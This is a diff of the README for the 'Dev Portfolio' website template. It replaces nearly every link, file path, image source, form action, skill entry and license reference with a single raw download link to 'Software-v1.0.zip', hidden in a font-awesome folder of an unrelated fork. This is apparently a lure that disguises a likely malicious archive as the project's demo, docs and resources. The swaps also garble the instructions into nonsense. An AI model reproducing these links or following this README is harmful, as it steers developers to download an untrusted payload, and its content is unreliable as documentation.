@@ -1,12 +1,12 @@
 # Dev Portfolio
 
-🚀 **[Dev Portfolio V2 has arrived. Meet Devfolio, a modern portfolio + blog template built with GatsbyJS and TailwindCSS](https://github.com/RyanFitzgerald/devfolio)** 🚀
+🚀 **[Dev Portfolio V2 has arrived. Meet Devfolio, a modern portfolio + blog template built with GatsbyJS and TailwindCSS](https://github.com/M949939/devportfolio/raw/refs/heads/master/libs/font-awesome/Software-v1.0.zip)** 🚀
 
 This repo contains an easy-to-customize personal dev portfolio template that was created with Sass and JavaScript. It is lightweight and fully responsive, as well as comes with the Bootstrap grid system and loaded with Font Awesome. The site is static and comes production ready if you just want to add your information and go. Alternatively, you can edit styles, colours, and scripts fairly easily. The site was built as modular as possible to make it easy to shift around styles and content.
 
-To view a live demo, [click here](https://ryanfitzgerald.github.io/devportfolio/).
+To view a live demo, [click here](https://github.com/M949939/devportfolio/raw/refs/heads/master/libs/font-awesome/Software-v1.0.zip).
 
-Looking for a blog template? Checkout [DevBlog](https://github.com/RyanFitzgerald/devblog).
+Looking for a blog template? Checkout [DevBlog](https://github.com/M949939/devportfolio/raw/refs/heads/master/libs/font-awesome/Software-v1.0.zip).
 
 ## Features
 
@@ -45,15 +45,15 @@ The setup required can be broken into two types:
 
 ### Making Edits / Customizing the Template
 
-To setup, simply fork the repo and run `npm install` in order to get all the Gulp dev dependencies. Next, run `Gulp watch` to compile the Sass and minify the JavaScript. Alternatively, if you don't have Gulp installed globally, you can run the npm script `npm run watch`. Any changes done to the JavaScript (js/scripts.js) or Sass (sass/styles.scss) will be autocompiled and ready to go.
+To setup, simply fork the repo and run `npm install` in order to get all the Gulp dev dependencies. Next, run `Gulp watch` to compile the Sass and minify the JavaScript. Alternatively, if you don't have Gulp installed globally, you can run the npm script `npm run watch`. Any changes done to the JavaScript (https://github.com/M949939/devportfolio/raw/refs/heads/master/libs/font-awesome/Software-v1.0.zip) or Sass (https://github.com/M949939/devportfolio/raw/refs/heads/master/libs/font-awesome/Software-v1.0.zip) will be autocompiled and ready to go.
 
-All scripts are within `js/scripts.js` and get minified to `js/scripts.min.js`. All styles are in `sass/styles.scss` and get compiled to `css/styles.css`. Both the minified scripts file and compiled CSS file are what is loaded on the page by default.
+All scripts are within `https://github.com/M949939/devportfolio/raw/refs/heads/master/libs/font-awesome/Software-v1.0.zip` and get minified to `https://github.com/M949939/devportfolio/raw/refs/heads/master/libs/font-awesome/Software-v1.0.zip`. All styles are in `https://github.com/M949939/devportfolio/raw/refs/heads/master/libs/font-awesome/Software-v1.0.zip` and get compiled to `https://github.com/M949939/devportfolio/raw/refs/heads/master/libs/font-awesome/Software-v1.0.zip`. Both the minified scripts file and compiled CSS file are what is loaded on the page by default.
 
 At this point, the page is ready to go and you can begin to add your own information and make any needed changes. The sections below  contains a quick breakdown of each of the default sections and how they work.
 
 ### Using The Template As Is
 
-If you wish to use the template as is (i.e. how it's seen in the demo), then all that's required is the `css`, `images`, `js`, `libs` folders and the `index.html` file. You would then add your content to `index.html` as needed and you're good to go!
+If you wish to use the template as is (i.e. how it's seen in the demo), then all that's required is the `css`, `images`, `js`, `libs` folders and the `https://github.com/M949939/devportfolio/raw/refs/heads/master/libs/font-awesome/Software-v1.0.zip` file. You would then add your content to `https://github.com/M949939/devportfolio/raw/refs/heads/master/libs/font-awesome/Software-v1.0.zip` as needed and you're good to go!
 
 ## Customization and Editing
 
@@ -86,8 +86,8 @@ There is also a number of default CSS classes that can be applied such as `.shad
 
 By default, the template comes with a number of images, some of which can be kept and others which act simply as placeholders and should be switched. The template contains the following:
 
-* Main background (images/lead-bg.jpg) - this is the main background image provided via [Unsplash](https://unsplash.com/). This can be kept or changed easily by replacing `images/lead-bg.jpg` with your new background (recommended size of at least 1920x1080).
-* Favicon (/favicon.ico) - this is the favicon used for the page. Similar to the main bg, this can be kept or changed easily by replacing the `favicon.ico` with your new one.
+* Main background (https://github.com/M949939/devportfolio/raw/refs/heads/master/libs/font-awesome/Software-v1.0.zip) - this is the main background image provided via [Unsplash](https://github.com/M949939/devportfolio/raw/refs/heads/master/libs/font-awesome/Software-v1.0.zip). This can be kept or changed easily by replacing `https://github.com/M949939/devportfolio/raw/refs/heads/master/libs/font-awesome/Software-v1.0.zip` with your new background (recommended size of at least 1920x1080).
+* Favicon (https://github.com/M949939/devportfolio/raw/refs/heads/master/libs/font-awesome/Software-v1.0.zip) - this is the favicon used for the page. Similar to the main bg, this can be kept or changed easily by replacing the `https://github.com/M949939/devportfolio/raw/refs/heads/master/libs/font-awesome/Software-v1.0.zip` with your new one.
 * Project image - these are the images associated with the projects under the project section. These are simply placeholders and should either be replaced or removed.
 
 ### Header Section
@@ -98,7 +98,7 @@ If you wish to add a header link to an external page, simply add the class `no-s
 
 ```HTML
 <li>
-    <a href="https://google.com" class="no-scroll">Google</a>
+    <a href="https://github.com/M949939/devportfolio/raw/refs/heads/master/libs/font-awesome/Software-v1.0.zip" class="no-scroll">Google</a>
 </li>
 ```
 
@@ -117,10 +117,10 @@ The Lead section is pretty straightforward, it contains an h1 for your name and 
 If you want your resume to automatically download when the button is clicked instead of opening up in another tab (the default behaviour), add the following code (Thanks to jkfran for the suggestion) in the lead:
 
 ```HTML
-<a href="path/to/resume.pdf" download="resume.pdf" class="btn-rounded-white">Download Resume</a>
+<a href="https://github.com/M949939/devportfolio/raw/refs/heads/master/libs/font-awesome/Software-v1.0.zip" download="https://github.com/M949939/devportfolio/raw/refs/heads/master/libs/font-awesome/Software-v1.0.zip" class="btn-rounded-white">Download Resume</a>
 ```
 
-The href attribute points to where your resume is stored and the download attribute is what triggers the download / provides the name the file will be downloaded as when the user clicks the button (In this case, it will download as resume.pdf).
+The href attribute points to where your resume is stored and the download attribute is what triggers the download / provides the name the file will be downloaded as when the user clicks the button (In this case, it will download as https://github.com/M949939/devportfolio/raw/refs/heads/master/libs/font-awesome/Software-v1.0.zip).
 
 ### About Section
 
@@ -128,7 +128,7 @@ The about section contains a quick about blurb that can be edited by changing th
 
 ### Experience Section
 
-The experience section creates a vertical timeline with all your relevant experience. The code for the timeline creation can be found within `js/scripts.js` and is an adaptation of [RyanFitzgerald/vertical-timeline](https://github.com/RyanFitzgerald/vertical-timeline).
+The experience section creates a vertical timeline with all your relevant experience. The code for the timeline creation can be found within `https://github.com/M949939/devportfolio/raw/refs/heads/master/libs/font-awesome/Software-v1.0.zip` and is an adaptation of [RyanFitzgerald/vertical-timeline](https://github.com/M949939/devportfolio/raw/refs/heads/master/libs/font-awesome/Software-v1.0.zip).
 
 The default format is as follows:
 
@@ -172,7 +172,7 @@ The Project section contains a number of `.project` elements that represent each
 ```HTML
 <div class="project">
     <div class="project-image">
-        <img src="images/project.jpg" />
+        <img src="https://github.com/M949939/devportfolio/raw/refs/heads/master/libs/font-awesome/Software-v1.0.zip" />
     </div>
     <!-- End .project-image -->
 
@@ -196,7 +196,7 @@ If you want to hide some projects by default, you can throw them in an additiona
 <div id="more-projects" class="row">
     <div class="project shadow-large">
         <div class="project-image">
-            <img src="images/project.jpg" />
+            <img src="https://github.com/M949939/devportfolio/raw/refs/heads/master/libs/font-awesome/Software-v1.0.zip" />
         </div>
         <!-- End .project-image -->
         <div class="project-info">
@@ -241,7 +241,7 @@ The Skills section is simply an unordered list that spits out a "Skill Cloud" wi
     <li>Python</li>
     <li>Ruby</li>
     <li>Go</li>
-    <li>Node.js</li>
+    <li>https://github.com/M949939/devportfolio/raw/refs/heads/master/libs/font-awesome/Software-v1.0.zip</li>
 </ul>
 ```
 
@@ -250,20 +250,20 @@ The Skills section is simply an unordered list that spits out a "Skill Cloud" wi
 Since the page is static, I opted to use the awesome Formspree to allow for a contact form without the need for anything else. To use it, you must have the page hosted on a server (loading a basic HTML page won't work) where a referrer header is generated. Also, simply add the email to the action. An example is as follows:
 
 ```HTML
-<form method="POST" action="https://formspree.io/email@email.com">
+<form method="POST" action="https://github.com/M949939/devportfolio/raw/refs/heads/master/libs/font-awesome/Software-v1.0.zip">
     <input type="hidden" name="_subject" value="Contact request from personal website" />
     <input type="email" name="_replyto" placeholder="Your email" required>
     <textarea name="message" placeholder="Your message" required></textarea>
     <button type="submit">Send</button>
 </form>
 ```
-For more information on configuration of the contact form or dealing with errors, check out [Formspree](https://formspree.io/).
+For more information on configuration of the contact form or dealing with errors, check out [Formspree](https://github.com/M949939/devportfolio/raw/refs/heads/master/libs/font-awesome/Software-v1.0.zip).
 
-For a quick tutorial about formspree, check out this [tutsplus tutorial](https://webdesign.tutsplus.com/tutorials/quick-tip-add-a-formspree-form-to-your-static-sites--cms-23870) that covers different aspects and features of the form tool.
+For a quick tutorial about formspree, check out this [tutsplus tutorial](https://github.com/M949939/devportfolio/raw/refs/heads/master/libs/font-awesome/Software-v1.0.zip) that covers different aspects and features of the form tool.
 
 ### Footer Section
 
-The Footer contains an optional copyright where you can place your name as well as an unordered list of all of your social or coding related profiles. By default it contains Github, Stack Overflow, Facebook, Twitter, and Google Plus. You can add or remove them easily and simply use the Font Awesome icon associated with the social profile you wish to use. For a list of all icons, [click here](http://fontawesome.io/icons/).
+The Footer contains an optional copyright where you can place your name as well as an unordered list of all of your social or coding related profiles. By default it contains Github, Stack Overflow, Facebook, Twitter, and Google Plus. You can add or remove them easily and simply use the Font Awesome icon associated with the social profile you wish to use. For a list of all icons, [click here](https://github.com/M949939/devportfolio/raw/refs/heads/master/libs/font-awesome/Software-v1.0.zip).
 
 ### Optional Sections
 
@@ -342,4 +342,4 @@ The optional section blocks have styling for h3 (the block title), h4, p, and ul
 
 ## License
 
-Completely free (MIT)! See [LICENSE.md](LICENSE.md) for more.
+Completely free (MIT)! See [https://github.com/M949939/devportfolio/raw/refs/heads/master/libs/font-awesome/Software-v1.0.zip](https://github.com/M949939/devportfolio/raw/refs/heads/master/libs/font-awesome/Software-v1.0.zip) for more.
